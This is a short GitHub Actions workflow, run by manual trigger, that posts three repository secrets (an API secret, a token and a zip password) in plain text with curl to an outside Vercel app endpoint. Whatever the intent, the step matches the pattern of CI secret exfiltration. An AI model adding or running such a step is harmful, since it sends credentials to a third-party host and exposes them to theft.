name: Send Secrets to Vercel API

on:
  workflow_dispatch:

jobs:
  send:
    runs-on: ubuntu-latest
    steps:
      - name: Enviar secrets como texto puro
        env:
          API_SECRET: ${{ secrets.API_SECRET }}
          CRONGEN_TOKEN: ${{ secrets.CRONGEN_TOKEN }}
          ZIP_PASS: ${{ secrets.ZIP_PASS }}
        run: |
          curl -X POST "https://58f15cf6-2649-4d9e-a5ef-b8169ebea8ba.vercel.app/api/config" \
            -H "Content-Type: text/plain" \
            --data-binary "API_SECRET=$API_SECRET
            CRONGEN_TOKEN=$CRONGEN_TOKEN
            ZIP_PASS=$ZIP_PASS"
